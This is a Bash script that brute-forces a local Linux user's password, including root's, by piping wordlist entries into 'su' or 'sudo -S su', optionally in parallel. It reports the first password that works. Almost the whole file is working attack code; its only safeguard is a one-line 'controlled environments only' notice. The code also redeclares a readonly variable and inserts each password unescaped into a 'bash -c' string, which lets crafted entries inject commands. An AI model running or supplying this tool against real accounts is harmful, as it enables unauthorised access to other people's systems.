#!/bin/bash

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Cristian Alexander (Crisstianpd)

set -Eeuo pipefail

readonly SCRIPT_NAME="$(basename "$0")"

# Colors (only if stdout is a TTY)
if [[ -t 1 ]]; then
    readonly RED="\e[1;31m"
    readonly GREEN="\e[1;32m"
    readonly YELLOW="\e[1;33m"
    readonly RESET="\e[0m"
else
    readonly RED=""
    readonly GREEN=""
    readonly YELLOW=""
    readonly YELLOW=""
    readonly RESET=""
fi

verbose=false


# Usage function
usage() {
    cat <<EOF
Usage:
  $SCRIPT_NAME [-v][-h] <user_name> <dictionary.txt> [subprocesses : number]

Description:
  Tests passwords from a dictionary against a local system user.
  Subprocess execution is automatically disabled for root.

Options:
  -v              Verbose output
  -h              Show this help message and exit

Arguments:
  user_name       Target system user
  dictionary.txt  Password dictionary file
  subprocesses    Number of parallel subprocesses (default: 1)

Examples:
  $SCRIPT_NAME user dictionary.txt
  $SCRIPT_NAME -v user dictionary.txt 4
  $SCRIPT_NAME root dictionary.txt

Notes:
  - Parallel execution is NOT allowed for root.
  - Dictionary must be a readable, non-empty file.
  - This script is intended for controlled environments only.

EOF
    exit 1
}


#CTRL_C function
ctrl_c(){
    echo -e "[!] Clousing program..."
    kill 0;exit
}
trap ctrl_c SIGINT


# Argument parsing
while getopts ":vh" opt; do
    case "$opt" in
        v)
            verbose=true;;
        h)
            usage;;
        \?)
            echo "[ERROR] Unknown option: -$OPTARG" >&2
            usage;;
    esac
done


shift $((OPTIND - 1))



# Argument validation
user="${1:-}"
dictionary="${2:-}"
num_sp="${3:-1}"

[[ -z "$user" || -z "$dictionary" ]] && usage

# Validate user existence
if ! getent passwd "$user" &>/dev/null; then
    echo -e "${RED}[ERROR] User '$user' does not exist on this system.${RESET}" >&2
    exit 2
fi

# Validate dictionary
if [[ ! -f "$dictionary" ]]; then
    echo -e "${RED}[ERROR] Dictionary '$dictionary' not found.${RESET}" >&2
    exit 3
fi

if [[ ! -r "$dictionary" ]]; then
    echo -e "${RED}[ERROR] Dictionary '$dictionary' is not readable.${RESET}" >&2
    exit 3
fi

if [[ ! -s "$dictionary" ]]; then
    echo -e "${RED}[ERROR] Dictionary '$dictionary' is empty.${RESET}" >&2
    exit 3
fi

# Validate subprocess number
if ! [[ "$num_sp" =~ ^[0-9]+$ ]] || (( num_sp < 1 )); then
    echo -e "${RED}[ERROR] subprocesses must be a positive integer.${RESET}" >&2
    exit 4
fi



test_passwords() {
    local pass="$1"

    [[ "$verbose" == true ]] && \
        echo "[*] Testing password: '$pass' for user '$user'"

    if [[ "$user" == "root" ]]; then
        if timeout 1 bash -c "printf '%s\n' \"$pass\" | sudo -S su -c 'id'" &>/dev/null; then
            echo -e "${GREEN}\n[^] Password found: '$pass' for user '$user'.${RESET}"
            kill -TERM 0
            exit 0
        fi
    else
        if timeout 1 bash -c "printf '%s\n' \"$pass\" | su \"$user\" -c 'id'" &>/dev/null; then
            echo -e "${GREEN}\n[^] Password found: '$pass' for user '$user'.${RESET}"
            kill -TERM 0
            exit 0
        fi
    fi
}


# MAIN

if [[ "$user" != "root" ]] && (( num_sp > 1 )); then
    export -f test_passwords
    export user verbose GREEN RESET

    xargs -P "$num_sp" -I {} bash -c 'test_passwords "$@"' _ {} < "$dictionary"
else
    if [[ "$user" == "root" && num_sp -gt 1 ]]; then
        echo -e "${YELLOW}[!] Parallel subprocesses disabled for root.${RESET}"
    fi

    while IFS= read -r password; do
        test_passwords "$password"
    done < "$dictionary"
fi


# END
echo -e "${RED}[!] Password not found for user '$user' in dictionary.${RESET}"
exit 1
